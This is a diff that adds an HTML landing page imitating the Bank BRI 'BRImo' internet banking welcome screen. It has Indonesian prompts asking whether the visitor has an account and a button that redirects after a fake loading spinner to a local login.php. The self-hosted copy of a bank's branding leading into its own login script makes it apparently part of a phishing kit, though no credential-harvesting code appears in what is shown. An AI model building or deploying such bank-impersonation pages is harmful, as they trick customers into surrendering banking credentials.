@@ -1,0 +1,55 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon.png">
+    <link rel="icon" href="./assets/favicon-brimo.ico">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>BRIMO</title>
+    <meta name="next-head-count" content="10">
+    <link rel="stylesheet" type="text/css" href="./assets/main.css">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    
+    <link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
+  <link href="./assets/css/component-spinners.css" rel="stylesheet">
+
+    <noscript data-n-css=""></noscript>
+  </head>
+  <body class="brimo-ui-light">
+    <div id="brimo">
+      <div class="css-536van1">
+        <div class="css-1sm2s1z1">
+          <div class="brimo-header-none">            
+            <img src="./assets/muda.png" class="css-1v97jab">
+          </div>
+          <div class="css-1meg77l">
+            <p class="brimo-text css-welcome-home">Selamat Datang di BRImo</p>
+            <p class="brimo-text css-text-home">Apakah Anda memiliki akun</p>
+            <p class="brimo-text css-text-home">Internet Banking Bank BRI?</p>
+            <button type="button" id="Login" class="brimo-button btn-center btn-spinner btn-spinner-example css-aylbpp btn-spinner-example">Punya Akun</button>
+            <button type="button" class="btn-belum">Belum Punya Akun</button>
+          </div>
+        </div>
+      </div>
+      <span hidden="" class="brimo-env"></span>
+    </div>
+
+  
+ 
+
+
+<script src="assets/js/component-spinners.js"></script>
+  <script type="text/javascript">
+    $('.btn-spinner-example').click(function() {
+      var btn = $(this);
+      $(btn).buttonLoader('start');
+      setTimeout(function() {
+        $(btn).buttonLoader('stop');
+        window.location.href='login.php';
+      }, 1000);
+    });
+  </script></body></html>
